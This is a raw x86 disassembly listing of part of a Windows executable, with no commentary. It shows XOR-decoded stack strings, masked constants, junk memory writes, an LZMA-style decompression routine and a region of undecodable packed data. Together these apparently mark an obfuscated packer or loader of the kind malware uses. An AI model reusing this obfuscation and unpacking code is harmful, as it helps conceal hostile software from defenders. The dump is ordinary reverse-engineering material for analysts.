  424bb2:	mov    DWORD PTR [ebp-0x4],eax
  424bb5:	mov    BYTE PTR [ebp-0x18],0x13
  424bb9:	mov    BYTE PTR [ebp-0x17],0x1e
  424bbd:	mov    BYTE PTR [ebp-0x16],0x15
  424bc1:	mov    BYTE PTR [ebp-0x15],0x4f
  424bc5:	mov    BYTE PTR [ebp-0x14],0x4c
  424bc9:	mov    BYTE PTR [ebp-0x13],0x7a
  424bcd:	mov    BYTE PTR [ebp-0x20],0x1
  424bd1:	mov    BYTE PTR [ebp-0x1f],0xf
  424bd5:	mov    BYTE PTR [ebp-0x1e],0x11
  424bd9:	mov    BYTE PTR [ebp-0x1d],0xc
  424bdd:	mov    BYTE PTR [ebp-0x1c],0x4f
  424be1:	mov    BYTE PTR [ebp-0x1b],0x4c
  424be5:	mov    BYTE PTR [ebp-0x1a],0x7a
  424be9:	mov    BYTE PTR [ebp-0x28],0xf
  424bed:	mov    BYTE PTR [ebp-0x27],0x12
  424bf1:	mov    BYTE PTR [ebp-0x26],0x16
  424bf5:	mov    BYTE PTR [ebp-0x25],0x3
  424bf9:	mov    BYTE PTR [ebp-0x24],0x1d
  424bfd:	mov    BYTE PTR [ebp-0x23],0xa
  424c01:	push   esi
  424c02:	mov    BYTE PTR [ebp-0x22],0x15
  424c06:	mov    BYTE PTR [ebp-0x21],0x7a
  424c0a:	xor    esi,esi
  424c0c:	mov    eax,0xfd
  424c11:	lea    ecx,[ebp+esi*1-0x18]
  424c15:	movzx  edx,BYTE PTR [ecx]
  424c18:	xor    edx,0x79
  424c1b:	add    edx,eax
  424c1d:	inc    esi
  424c1e:	mov    BYTE PTR [ecx],dl
  424c20:	cmp    esi,0x6
  424c23:	jb     0x424c11
  424c25:	xor    esi,esi
  424c27:	lea    ecx,[ebp+esi*1-0x20]
  424c2b:	movzx  edx,BYTE PTR [ecx]
  424c2e:	xor    edx,0x79
  424c31:	add    edx,eax
  424c33:	inc    esi
  424c34:	mov    BYTE PTR [ecx],dl
  424c36:	cmp    esi,0x7
  424c39:	jb     0x424c27
  424c3b:	xor    esi,esi
  424c3d:	lea    ecx,[ebp+esi*1-0x28]
  424c41:	movzx  edx,BYTE PTR [ecx]
  424c44:	xor    edx,0x79
  424c47:	add    edx,eax
  424c49:	inc    esi
  424c4a:	mov    BYTE PTR [ecx],dl
  424c4c:	cmp    esi,0x8
  424c4f:	jb     0x424c3d
  424c51:	lea    eax,[ebp-0x2c]
  424c54:	mov    DWORD PTR [ebp-0x8],eax
  424c57:	mov    ecx,DWORD PTR [ebp-0x8]
  424c5a:	mov    eax,0x7113fcce
  424c5f:	mov    DWORD PTR [ecx],eax
  424c61:	mov    ecx,DWORD PTR [ebp-0x2c]
  424c64:	push   edi
  424c65:	mov    esi,0x4e3e
  424c6a:	mov    ebx,0x3272ec
  424c6f:	cmp    ecx,eax
  424c71:	jne    0x424d3c
  424c77:	lea    eax,[esi+0x29]
  424c7a:	mov    WORD PTR [ebp-0x78],ax
  424c7e:	mov    eax,esi
  424c80:	mov    WORD PTR [ebp-0x76],ax
  424c84:	add    eax,0x3b
  424c87:	mov    WORD PTR [ebp-0x74],ax
  424c8b:	lea    eax,[esi-0x6]
  424c8e:	mov    WORD PTR [ebp-0x72],ax
  424c92:	add    eax,0x47
  424c95:	mov    ecx,eax
  424c97:	lea    eax,[esi-0x1d]
  424c9a:	mov    WORD PTR [ebp-0x66],ax
  424c9e:	mov    eax,esi
  424ca0:	mov    WORD PTR [ebp-0x64],ax
  424ca4:	add    eax,0xffffffe4
  424ca7:	mov    WORD PTR [ebp-0x62],ax
  424cab:	mov    eax,0x44b
  424cb0:	mov    WORD PTR [ebp-0x60],ax
  424cb4:	mov    eax,0x5664
  424cb9:	mov    WORD PTR [ebp-0x5e],ax
  424cbd:	mov    eax,0x6104
  424cc2:	mov    WORD PTR [ebp-0x5c],ax
  424cc6:	lea    eax,[ebp-0xe0]
  424ccc:	push   eax
  424ccd:	mov    eax,DWORD PTR [ebp+0xc]
  424cd0:	mov    edi,0x75108a4
  424cd5:	xor    eax,edi
  424cd7:	add    eax,ebx
  424cd9:	push   eax
  424cda:	mov    WORD PTR [ebp-0x70],cx
  424cde:	lea    ecx,[esi-0x1a]
  424ce1:	mov    edx,ecx
  424ce3:	lea    eax,[ebp-0x78]
  424ce6:	push   eax
  424ce7:	mov    eax,DWORD PTR [ebp-0x4]
  424cea:	mov    eax,DWORD PTR [eax+0x198]
  424cf0:	mov    WORD PTR [ebp-0x6e],dx
  424cf4:	mov    edx,0x4f82
  424cf9:	mov    WORD PTR [ebp-0x6c],dx
  424cfd:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e25
  424d04:	mov    DWORD PTR [ebp-0x5a],0x4e24f116
  424d0b:	mov    DWORD PTR [ebp-0xe0],0x1
  424d15:	mov    DWORD PTR [ebp-0xdc],0x255
  424d1f:	push   DWORD PTR [eax]
  424d21:	mov    eax,DWORD PTR [ebp+0x10]
  424d24:	call   eax
  424d26:	mov    DWORD PTR [ebp-0x8],eax
  424d29:	mov    eax,DWORD PTR [ebp-0x8]
  424d2c:	test   eax,eax
  424d2e:	je     0x424d41
  424d30:	xor    DWORD PTR ds:0x76586876,0x87687666
  424d3a:	jmp    0x424d41
  424d3c:	mov    edi,0x75108a4
  424d41:	mov    eax,DWORD PTR [ebp-0x4]
  424d44:	mov    ecx,DWORD PTR [eax+0x18c]
  424d4a:	xor    eax,eax
  424d4c:	cmp    DWORD PTR [ecx],eax
  424d4e:	jne    0x424fbd
  424d54:	mov    ecx,DWORD PTR [ebp-0x4]
  424d57:	mov    ecx,DWORD PTR [ecx+0x17c]
  424d5d:	mov    DWORD PTR [ecx],eax
  424d5f:	mov    ecx,DWORD PTR [ebp-0x4]
  424d62:	mov    ecx,DWORD PTR [ecx+0x180]
  424d68:	mov    DWORD PTR [ecx],eax
  424d6a:	mov    eax,0x4e69
  424d6f:	mov    WORD PTR [ebp-0x9c],ax
  424d76:	mov    eax,esi
  424d78:	mov    WORD PTR [ebp-0x9a],ax
  424d7f:	mov    eax,0x4e79
  424d84:	mov    WORD PTR [ebp-0x98],ax
  424d8b:	add    eax,0xffffffc0
  424d8e:	mov    WORD PTR [ebp-0x96],ax
  424d95:	mov    eax,0x4f8e
  424d9a:	mov    WORD PTR [ebp-0x94],ax
  424da1:	mov    eax,0x4e3a
  424da6:	mov    WORD PTR [ebp-0x92],ax
  424dad:	add    eax,0x45
  424db0:	mov    WORD PTR [ebp-0x90],ax
  424db7:	mov    eax,0x4e24
  424dbc:	mov    WORD PTR [ebp-0x8e],ax
  424dc3:	mov    eax,esi
  424dc5:	mov    WORD PTR [ebp-0x8c],ax
  424dcc:	mov    eax,0x4e25
  424dd1:	mov    WORD PTR [ebp-0x8a],ax
  424dd8:	mov    eax,0x99f9
  424ddd:	mov    WORD PTR [ebp-0x88],ax
  424de4:	mov    eax,0x8d6a
  424de9:	mov    WORD PTR [ebp-0x86],ax
  424df0:	mov    eax,0xd66f
  424df5:	mov    WORD PTR [ebp-0x84],ax
  424dfc:	mov    eax,0xd78b
  424e01:	mov    WORD PTR [ebp-0x82],ax
  424e08:	mov    eax,0x27b4
  424e0d:	mov    WORD PTR [ebp-0x80],ax
  424e11:	mov    eax,0x47b4
  424e16:	mov    WORD PTR [ebp-0x7e],ax
  424e1a:	mov    eax,0x4e3b
  424e1f:	push   0x8
  424e21:	mov    WORD PTR [ebp-0x7c],ax
  424e25:	mov    DWORD PTR [ebp-0x10],0x316120f
  424e2c:	mov    DWORD PTR [ebp-0xc],0x7a150a1d
  424e33:	lea    eax,[ebp-0x10]
  424e36:	pop    ecx
  424e37:	mov    dl,BYTE PTR [eax]
  424e39:	xor    dl,0x79
  424e3c:	sub    dl,0x3
  424e3f:	mov    BYTE PTR [eax],dl
  424e41:	inc    eax
  424e42:	dec    ecx
  424e43:	jne    0x424e37
  424e45:	lea    eax,[ebp-0x10]
  424e48:	mov    DWORD PTR [ebp-0xdc],eax
  424e4e:	lea    eax,[ebp-0xe0]
  424e54:	push   eax
  424e55:	mov    eax,DWORD PTR [ebp+0xc]
  424e58:	xor    eax,edi
  424e5a:	add    eax,ebx
  424e5c:	push   eax
  424e5d:	mov    eax,DWORD PTR [ebp-0x4]
  424e60:	add    eax,0x66
  424e63:	push   eax
  424e64:	mov    eax,DWORD PTR [ebp-0x4]
  424e67:	mov    eax,DWORD PTR [eax+0x198]
  424e6d:	mov    DWORD PTR [ebp-0xe0],0x1
  424e77:	push   DWORD PTR [eax]
  424e79:	mov    eax,DWORD PTR [ebp+0x10]
  424e7c:	call   eax
  424e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  424e81:	xor    ecx,edi
  424e83:	add    ecx,ebx
  424e85:	mov    DWORD PTR [ebp-0x8],eax
  424e88:	cmp    eax,ecx
  424e8a:	jne    0x424ea5
  424e8c:	mov    eax,ds:0x33730bcf
  424e91:	or     eax,0x22150bce
  424e96:	mov    ds:0x33730bcf,eax
  424e9b:	add    eax,0x3372e92e
  424ea0:	mov    ds:0x33730bcf,eax
  424ea5:	mov    ecx,0x4f96
  424eaa:	mov    eax,ecx
  424eac:	mov    WORD PTR [ebp-0x40],ax
  424eb0:	mov    eax,0x4e63
  424eb5:	mov    edx,eax
  424eb7:	mov    WORD PTR [ebp-0x3e],dx
  424ebb:	lea    edx,[ecx+0x5]
  424ebe:	mov    WORD PTR [ebp-0x3c],dx
  424ec2:	add    edx,0xffffffe8
  424ec5:	mov    WORD PTR [ebp-0x3a],dx
  424ec9:	lea    edx,[ecx-0x9]
  424ecc:	mov    WORD PTR [ebp-0x38],dx
  424ed0:	add    edx,0xfffffffb
  424ed3:	mov    WORD PTR [ebp-0x36],dx
  424ed7:	lea    edx,[ecx+0x21]
  424eda:	mov    WORD PTR [ebp-0x34],dx
  424ede:	mov    WORD PTR [ebp-0x32],cx
  424ee2:	mov    ecx,esi
  424ee4:	mov    WORD PTR [ebp-0x30],cx
  424ee8:	lea    ecx,[edx-0x1]
  424eeb:	mov    edx,ecx
  424eed:	mov    WORD PTR [ebp-0x54],dx
  424ef1:	mov    edx,eax
  424ef3:	mov    WORD PTR [ebp-0x52],dx
  424ef7:	add    edx,0x18
  424efa:	mov    WORD PTR [ebp-0x50],dx
  424efe:	mov    WORD PTR [ebp-0x4e],ax
  424f02:	add    eax,0xa
  424f05:	mov    WORD PTR [ebp-0x4c],ax
  424f09:	mov    eax,0x4e68
  424f0e:	mov    WORD PTR [ebp-0x4a],ax
  424f12:	lea    eax,[ecx-0x1f]
  424f15:	mov    WORD PTR [ebp-0x48],ax
  424f19:	mov    WORD PTR [ebp-0x46],cx
  424f1d:	mov    WORD PTR [ebp-0x44],si
  424f21:	mov    eax,DWORD PTR [ebp+0x8]
  424f24:	movzx  ecx,WORD PTR [ebp-0x54]
  424f28:	xor    eax,edi
  424f2a:	add    eax,ebx
  424f2c:	xor    eax,ecx
  424f2e:	mov    WORD PTR [ebp-0x54],ax
  424f32:	mov    eax,DWORD PTR [ebp+0x8]
  424f35:	movzx  ecx,WORD PTR [ebp-0x40]
  424f39:	xor    eax,edi
  424f3b:	add    eax,ebx
  424f3d:	xor    eax,ecx
  424f3f:	mov    WORD PTR [ebp-0x40],ax
  424f43:	xor    eax,eax
  424f45:	mov    WORD PTR [ebp-0xf4],ax
  424f4c:	mov    WORD PTR [ebp-0x108],ax
  424f53:	mov    edi,DWORD PTR [ebp+0x24]
  424f56:	lea    eax,[ebp-0xf4]
  424f5c:	lea    edx,[ebp-0x54]
  424f5f:	mov    DWORD PTR [ebp-0xe0],0x2
  424f69:	mov    DWORD PTR [ebp-0xdc],eax
  424f6f:	call   0x427985
  424f74:	mov    DWORD PTR [ebp-0xd8],eax
  424f7a:	lea    eax,[ebp-0xe0]
  424f80:	push   eax
  424f81:	mov    eax,DWORD PTR [ebp+0xc]
  424f84:	xor    eax,0x75108a4
  424f89:	add    eax,ebx
  424f8b:	push   eax
  424f8c:	lea    eax,[ebp-0x9c]
  424f92:	push   eax
  424f93:	push   DWORD PTR [ebp-0x8]
  424f96:	mov    eax,DWORD PTR [ebp+0x10]
  424f99:	call   eax
  424f9b:	mov    edi,DWORD PTR [ebp+0x24]
  424f9e:	lea    eax,[ebp-0x108]
  424fa4:	lea    edx,[ebp-0x40]
  424fa7:	mov    DWORD PTR [ebp-0xdc],eax
  424fad:	call   0x427985
  424fb2:	mov    DWORD PTR [ebp-0xd8],eax
  424fb8:	mov    edi,0x75108a4
  424fbd:	mov    eax,DWORD PTR [ebp+0x14]
  424fc0:	push   DWORD PTR [ebp-0x4]
  424fc3:	push   DWORD PTR [ebp+0x20]
  424fc6:	push   DWORD PTR [ebp+0x1c]
  424fc9:	push   DWORD PTR [ebp+0x18]
  424fcc:	push   DWORD PTR [ebp+0x10]
  424fcf:	push   DWORD PTR [ebp+0x8]
  424fd2:	push   DWORD PTR [ebp+0xc]
  424fd5:	call   0x426222
  424fda:	test   eax,eax
  424fdc:	je     0x425020
  424fde:	add    DWORD PTR [ebp-0x4],eax
  424fe1:	push   DWORD PTR [ebp-0x4]
  424fe4:	lea    esi,[ebp+0x4]
  424fe7:	call   0x425410
  424fec:	mov    eax,DWORD PTR [ebp-0x4]
  424fef:	mov    eax,DWORD PTR [eax+0x1c8]
  424ff5:	mov    eax,DWORD PTR [eax]
  424ff7:	xor    eax,edi
  424ff9:	add    eax,ebx
  424ffb:	mov    eax,DWORD PTR [ebp-0x4]
  424ffe:	jne    0x425016
  425000:	mov    ecx,DWORD PTR [ebp-0x4]
  425003:	mov    ecx,DWORD PTR [ecx+0x1cc]
  425009:	push   DWORD PTR [ecx]
  42500b:	mov    eax,DWORD PTR [eax+0x1d8]
  425011:	call   DWORD PTR [eax+0x28]
  425014:	jmp    0x425020
  425016:	mov    eax,DWORD PTR [eax+0x17c]
  42501c:	mov    eax,DWORD PTR [eax]
  42501e:	add    DWORD PTR [esi],eax
  425020:	pop    edi
  425021:	pop    esi
  425022:	pop    ebx
  425023:	leave  
  425024:	ret    0x20
  425027:	push   edi
  425028:	push   esi
  425029:	push   ebx
  42502a:	push   ebp
  42502b:	mov    ebp,esp
  42502d:	mov    eax,DWORD PTR [ebp+0x24]
  425030:	add    DWORD PTR [ebp+0x28],eax
  425033:	push   eax
  425034:	cld    
  425035:	mov    esi,DWORD PTR [ebp+0x18]
  425038:	add    DWORD PTR [ebp+0x1c],esi
  42503b:	push   esi
  42503c:	mov    esi,DWORD PTR [ebp+0x14]
  42503f:	lods   eax,DWORD PTR ds:[esi]
  425040:	xchg   edx,eax
  425041:	push   edx
  425042:	mov    cl,BYTE PTR [esi-0x2]
  425045:	or     eax,0xffffffff
  425048:	shl    eax,cl
  42504a:	not    eax
  42504c:	push   eax
  42504d:	mov    cl,dh
  42504f:	or     eax,0xffffffff
  425052:	shl    eax,cl
  425054:	not    eax
  425056:	push   eax
  425057:	add    cl,dl
  425059:	mov    edi,esi
  42505b:	sub    esp,0xc
  42505e:	sub    eax,eax
  425060:	inc    eax
  425061:	push   eax
  425062:	push   eax
  425063:	push   eax
  425064:	push   eax
  425065:	push   eax
  425066:	push   edi
  425067:	sub    esi,esi
  425069:	push   esi
  42506a:	or     ebx,0xffffffff
  42506d:	mov    eax,0x300
  425072:	shl    eax,cl
  425074:	lea    ecx,[eax+0x736]
  42507a:	mov    eax,0x4000400
  42507f:	shr    ecx,1
  425081:	rep stos DWORD PTR es:[edi],eax
  425083:	push   0x5
  425085:	pop    ecx
  425086:	call   0x425371
  42508b:	loop   0x425086
  42508d:	lea    esi,[esi]
  42508f:	lea    edi,[edi]
  425091:	mov    edi,DWORD PTR [ebp-0x4]
  425094:	mov    eax,DWORD PTR [ebp-0x10]
  425097:	sub    edi,DWORD PTR [ebp+0x24]
  42509a:	and    eax,edi
  42509c:	mov    DWORD PTR [ebp-0x18],eax
  42509f:	mov    al,0x0
  4250a1:	call   0x425389
  4250a6:	jne    0x425141
  4250ac:	mov    cl,BYTE PTR [ebp-0xc]
  4250af:	and    edi,DWORD PTR [ebp-0x14]
  4250b2:	shl    edi,cl
  4250b4:	sub    cl,0x8
  4250b7:	neg    cl
  4250b9:	shr    esi,cl
  4250bb:	pop    eax
  4250bc:	add    edi,esi
  4250be:	pop    esi
  4250bf:	lea    edi,[edi+edi*2]
  4250c2:	shl    edi,0x8
  4250c5:	cmp    al,0x7
  4250c7:	pop    edx
  4250c8:	lea    ecx,[esi+edi*2+0xe6c]
  4250cf:	push   ecx
  4250d0:	push   esi
  4250d1:	mov    esi,0x100
  4250d6:	push   eax
  4250d7:	mov    al,0x1
  4250d9:	jb     0x42510f
  4250db:	mov    edi,DWORD PTR [ebp-0x4]
  4250de:	sub    edi,DWORD PTR [ebp-0x24]
  4250e1:	movzx  edi,BYTE PTR [edi]
  4250e4:	mov    ebp,DWORD PTR [ebp-0x34]
  4250e7:	shl    edi,1
  4250e9:	mov    ecx,esi
  4250eb:	and    esi,edi
  4250ed:	add    ecx,esi
  4250ef:	lea    ebp,[ebp+ecx*2+0x0]
  4250f3:	call   0x4253a8
  4250f8:	mov    ecx,eax
  4250fa:	shr    esi,0x8
  4250fd:	and    ecx,0x1
  425100:	cmp    esi,ecx
  425102:	mov    esi,0x100
  425107:	jne    0x425117
  425109:	cmp    eax,esi
  42510b:	jb     0x4250e4
  42510d:	jmp    0x425123
  42510f:	mov    ebp,DWORD PTR [ebp-0x34]
  425112:	call   0x4253a8
  425117:	inc    eax
  425118:	inc    esi
  425119:	sub    eax,0x1
  42511c:	sub    esi,0x1
  42511f:	cmp    eax,esi
  425121:	jb     0x42510f
  425123:	pop    edx
  425124:	inc    edx
  425125:	cmp    edx,0x5
  425128:	dec    edx
  425129:	mov    ecx,edx
  42512b:	jb     0x42513c
  42512d:	inc    edx
  42512e:	cmp    edx,0xb
  425131:	dec    edx
  425132:	mov    cl,0x4
  425134:	dec    cl
  425136:	jb     0x42513c
  425138:	mov    cl,0x7
  42513a:	dec    cl
  42513c:	sub    edx,ecx
  42513e:	push   edx
  42513f:	jmp    0x425190
  425141:	mov    al,0xc1
  425143:	dec    al
  425145:	call   0x425399
  42514a:	jne    0x425160
  42514c:	pop    eax
  42514d:	pop    edi
  42514e:	pop    edx
  42514f:	pop    ecx
  425150:	pop    edx
  425151:	pop    ecx
  425152:	push   DWORD PTR [esp]
  425155:	push   ecx
  425156:	push   edx
  425157:	mov    edx,0x664
  42515c:	mov    cl,0x0
  42515e:	jmp    0x4251d3
  425160:	mov    al,0xcd
  425162:	dec    al
  425164:	call   0x425399
  425169:	jne    0x425199
  42516b:	mov    al,0xf1
  42516d:	dec    al
  42516f:	call   0x425389
  425174:	jne    0x4251c9
  425176:	pop    eax
  425177:	cmp    al,0x7
  425179:	mov    al,0x9
  42517b:	jb     0x42517f
  42517d:	mov    al,0xb
  42517f:	push   eax
  425180:	mov    esi,DWORD PTR [ebp-0x4]
  425183:	sub    esi,DWORD PTR [ebp-0x24]
  425186:	cmp    esi,DWORD PTR [ebp+0x24]
  425189:	jb     0x425360
  42518f:	lods   al,BYTE PTR ds:[esi]
  425190:	mov    edi,DWORD PTR [ebp-0x4]
  425193:	stos   BYTE PTR es:[edi],al
  425194:	jmp    0x425327
  425199:	mov    al,0xd8
  42519b:	call   0x425399
  4251a0:	mov    esi,DWORD PTR [ebp-0x28]
  4251a3:	je     0x4251c0
  4251a5:	mov    al,0xe4
  4251a7:	call   0x425399
  4251ac:	mov    esi,DWORD PTR [ebp-0x2c]
  4251af:	je     0x4251ba
  4251b1:	mov    esi,DWORD PTR [ebp-0x30]
  4251b4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251b7:	mov    DWORD PTR [ebp-0x30],ecx
  4251ba:	mov    ecx,DWORD PTR [ebp-0x28]
  4251bd:	mov    DWORD PTR [ebp-0x2c],ecx
  4251c0:	mov    ecx,DWORD PTR [ebp-0x24]
  4251c3:	mov    DWORD PTR [ebp-0x28],ecx
  4251c6:	mov    DWORD PTR [ebp-0x24],esi
  4251c9:	pop    eax
  4251ca:	pop    edi
  4251cb:	pop    ecx
  4251cc:	mov    edx,0xa68
  4251d1:	mov    cl,0x8
  4251d3:	add    edx,edi
  4251d5:	push   edx
  4251d6:	push   edi
  4251d7:	cmp    al,0x7
  4251d9:	mov    al,cl
  4251db:	jb     0x4251df
  4251dd:	add    al,0x3
  4251df:	push   eax
  4251e0:	mov    ebp,DWORD PTR [ebp-0x34]
  4251e3:	call   0x4253a6
  4251e8:	jne    0x4251fe
  4251ea:	mov    eax,DWORD PTR [ebp-0x18]
  4251ed:	mov    edi,DWORD PTR [ebp-0x34]
  4251f0:	shl    eax,0x3
  4251f3:	sub    ecx,ecx
  4251f5:	push   0x8
  4251f7:	pop    esi
  4251f8:	lea    edi,[edi+eax*2+0x4]
  4251fc:	jmp    0x425233
  4251fe:	mov    ebp,DWORD PTR [ebp-0x34]
  425201:	add    ebp,0x2
  425204:	call   0x4253a6
  425209:	jne    0x425223
  42520b:	mov    eax,DWORD PTR [ebp-0x18]
  42520e:	mov    edi,DWORD PTR [ebp-0x34]
  425211:	shl    eax,0x3
  425214:	push   0x8
  425216:	pop    ecx
  425217:	push   0x8
  425219:	pop    esi
  42521a:	lea    edi,[edi+eax*2+0x104]
  425221:	jmp    0x425233
  425223:	mov    edi,0x204
  425228:	add    edi,DWORD PTR [ebp-0x34]
  42522b:	push   0x10
  42522d:	pop    ecx
  42522e:	mov    esi,0x100
  425233:	mov    DWORD PTR [ebp-0x1c],ecx
  425236:	sub    eax,eax
  425238:	inc    eax
  425239:	mov    ebp,edi
  42523b:	call   0x4253a8
  425240:	mov    ecx,eax
  425242:	sub    ecx,esi
  425244:	jb     0x425239
  425246:	add    DWORD PTR [ebp-0x1c],ecx
  425249:	cmp    DWORD PTR [ebp-0x3c],0x4
  42524d:	jae    0x425303
  425253:	add    DWORD PTR [ebp-0x3c],0x7
  425257:	mov    ecx,DWORD PTR [ebp-0x1c]
  42525a:	cmp    ecx,0x4
  42525d:	jb     0x425262
  42525f:	push   0x3
  425261:	pop    ecx
  425262:	mov    edi,DWORD PTR [ebp-0x38]
  425265:	shl    ecx,0x6
  425268:	sub    eax,eax
  42526a:	inc    eax
  42526b:	push   0x40
  42526d:	pop    esi
  42526e:	lea    edi,[edi+ecx*2+0x360]
  425275:	mov    ebp,edi
  425277:	call   0x4253a8
  42527c:	mov    ecx,eax
  42527e:	sub    ecx,esi
  425280:	jb     0x425275
  425282:	mov    DWORD PTR [ebp-0x18],ecx
  425285:	mov    DWORD PTR [ebp-0x24],ecx
  425288:	cmp    ecx,0x4
  42528b:	jb     0x425300
  42528d:	mov    esi,ecx
  42528f:	and    DWORD PTR [ebp-0x24],0x1
  425293:	shr    esi,1
  425295:	or     DWORD PTR [ebp-0x24],0x2
  425299:	dec    esi
  42529a:	cmp    ecx,0xe
  42529d:	jae    0x4252b8
  42529f:	mov    eax,0x2af
  4252a4:	sub    eax,ecx
  4252a6:	mov    ecx,esi
  4252a8:	shl    BYTE PTR [ebp-0x24],cl
  4252ab:	add    eax,DWORD PTR [ebp-0x24]
  4252ae:	shl    eax,1
  4252b0:	add    eax,DWORD PTR [ebp-0x38]
  4252b3:	mov    DWORD PTR [ebp-0x34],eax
  4252b6:	jmp    0x4252e5
  4252b8:	sub    esi,0x4
  4252bb:	call   0x425365
  4252c0:	shr    ebx,1
  4252c2:	shl    DWORD PTR [ebp-0x24],1
  4252c5:	cmp    DWORD PTR [ebp-0x20],ebx
  4252c8:	jb     0x4252d0
  4252ca:	inc    DWORD PTR [ebp-0x24]
  4252cd:	sub    DWORD PTR [ebp-0x20],ebx
  4252d0:	dec    esi
  4252d1:	jne    0x4252bb
  4252d3:	mov    eax,0x644
  4252d8:	add    eax,DWORD PTR [ebp-0x38]
  4252db:	mov    DWORD PTR [ebp-0x34],eax
  4252de:	shl    DWORD PTR [ebp-0x24],0x4
  4252e2:	push   0x4
  4252e4:	pop    esi
  4252e5:	sub    edi,edi
  4252e7:	inc    edi
  4252e8:	mov    eax,edi
  4252ea:	mov    ebp,DWORD PTR [ebp-0x34]
  4252ed:	call   0x4253a8
  4252f2:	test   al,0x1
  4252f4:	je     0x4252f9
  4252f6:	or     DWORD PTR [ebp-0x24],edi
  4252f9:	shl    edi,1
  4252fb:	dec    esi
  4252fc:	jne    0x4252ea
  4252fe:	jmp    0x425300
  425300:	inc    DWORD PTR [ebp-0x24]
  425303:	mov    ecx,DWORD PTR [ebp-0x1c]
  425306:	add    ecx,0x2
  425309:	mov    edi,DWORD PTR [ebp-0x4]
  42530c:	mov    eax,edi
  42530e:	sub    eax,DWORD PTR [ebp+0x24]
  425311:	cmp    DWORD PTR [ebp-0x24],eax
  425314:	ja     0x425360
  425316:	mov    esi,edi
  425318:	sub    esi,DWORD PTR [ebp-0x24]
  42531b:	mov    edx,DWORD PTR [ebp+0x28]
  42531e:	lods   al,BYTE PTR ds:[esi]
  42531f:	stos   BYTE PTR es:[edi],al
  425320:	cmp    edi,edx
  425322:	jae    0x425327
  425324:	dec    ecx
  425325:	jne    0x42531e
  425327:	mov    DWORD PTR [ebp-0x4],edi
  42532a:	movzx  esi,al
  42532d:	cmp    edi,DWORD PTR [ebp+0x28]
  425330:	jb     0x425091
  425336:	call   0x425365
  42533b:	sub    eax,eax
  42533d:	lea    ebp,[esp+0x3c]
  425341:	mov    edx,DWORD PTR [ebp+0x20]
  425344:	mov    esi,DWORD PTR [ebp-0x8]
  425347:	sub    esi,DWORD PTR [ebp+0x18]
  42534a:	mov    DWORD PTR [edx],esi
  42534c:	mov    edx,DWORD PTR [ebp+0x2c]
  42534f:	mov    edi,DWORD PTR [ebp-0x4]
  425352:	sub    edi,DWORD PTR [ebp+0x24]
  425355:	mov    DWORD PTR [edx],edi
  425357:	leave  
  425358:	pop    ebx
  425359:	pop    esi
  42535a:	pop    edi
  42535b:	ret    0x1c
  42535e:	pop    esi
  42535f:	pop    eax
  425360:	sub    eax,eax
  425362:	inc    eax
  425363:	jmp    0x42533d
  425365:	cmp    ebx,0x1000000
  42536b:	jb     0x42536e
  42536d:	ret    
  42536e:	shl    ebx,0x8
  425371:	push   esi
  425372:	mov    esi,DWORD PTR [ebp-0x8]
  425375:	cmp    esi,DWORD PTR [ebp+0x1c]
  425378:	jae    0x42535e
  42537a:	mov    eax,DWORD PTR [ebp-0x20]
  42537d:	shl    eax,0x8
  425380:	lods   al,BYTE PTR ds:[esi]
  425381:	mov    DWORD PTR [ebp-0x20],eax
  425384:	mov    DWORD PTR [ebp+0x74],esi
  425387:	aas    
  425388:	or     bl,BYTE PTR [edx-0xf5ef3e3]
  42538e:	add    al,0x6
  425390:	inc    esi
  425391:	mov    ecx,DWORD PTR [ecx+0x689540d]
  425397:	pop    edx
  425398:	(bad)  
  425399:	mov    eax,ds:0xd8904f0
  42539e:	or     al,0x9a
  4253a0:	pop    ebp
  4253a1:	adc    al,0x9e
  4253a3:	pop    ebx
  4253a4:	or     eax,0x9e04d983
  4253a9:	pop    ebx
  4253aa:	or     eax,0x837a8683
  4253af:	add    DWORD PTR [ebx-0x6544967b],0x1b
  4253b6:	retf   
  4253b7:	repz push es
  4253b9:	dec    ebx
  4253ba:	retf   
  4253bb:	ret    
  4253bc:	xchg   ebx,eax
  4253bd:	stc    
  4253be:	sbb    ecx,ebx
  4253c0:	cmp    ebp,DWORD PTR [ecx-0x44]
  4253c3:	cwde   
  4253c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253c5:	or     BYTE PTR [ebx],0xcb
  4253c8:	repz push es
  4253ca:	dec    edx
  4253cb:	xchg   ebx,eax
  4253cc:	xchg   esp,eax
  4253cd:	sub    ecx,ebx
  4253cf:	ret    
  4253d0:	call   0x683:0x2df2a11a
  4253d7:	push   esi
  4253d8:	cdq    
  4253d9:	mov    eax,ds:0x1bf518e2
  4253de:	retf   
  4253df:	ret    
  4253e0:	imul   esi,DWORD PTR [ecx-0x7c09c966],0xd9838393
  4253ea:	sbb    BYTE PTR [esi],al
  4253ec:	push   esi
  4253ed:	lea    ecx,[edi-0x7b]
  4253f0:	sbb    eax,0x9e048983
  4253f5:	pop    ebx
  4253f6:	retf   
  4253f7:	add    ecx,DWORD PTR [edx]
  4253f9:	push   es
  4253fa:	pop    eax
  4253fb:	(bad)  
  4253fc:	aad    0x1b
  4253fe:	retf   
  4253ff:	ret    
  425400:	fnstenv [esi]
  425402:	dec    edi
  425403:	aad    0x2d
  425405:	add    DWORD PTR [ebx],0xffffffc0
  425408:	add    eax,0x1
  42540b:	lea    ebp,[esp+0x40]
  42540f:	ret    
  425410:	push   ebp
  425411:	mov    ebp,esp
  425413:	sub    esp,0x12c
  425419:	push   ebx
  42541a:	push   esi
  42541b:	push   edi
  42541c:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  425423:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  42542a:	mov    eax,DWORD PTR [ebp+0x8]
  42542d:	mov    DWORD PTR [ebp+0x8],eax
  425430:	mov    ecx,DWORD PTR [ebp-0x10]
  425433:	mov    ebx,0x75108a4
  425438:	xor    ecx,ebx
  42543a:	mov    eax,0x3272ec
  42543f:	add    ecx,eax
  425441:	mov    DWORD PTR [ebp-0x2c],ecx
  425444:	mov    ecx,DWORD PTR [ebp-0x10]
  425447:	xor    ecx,ebx
  425449:	add    ecx,eax
  42544b:	mov    DWORD PTR [ebp-0x3c],ecx
  42544e:	mov    ecx,DWORD PTR [ebp-0x10]
  425451:	xor    ecx,ebx
  425453:	add    ecx,eax
  425455:	mov    DWORD PTR [ebp-0x40],ecx
  425458:	mov    ecx,DWORD PTR [ebp-0x10]
  42545b:	xor    ecx,ebx
  42545d:	add    ecx,eax
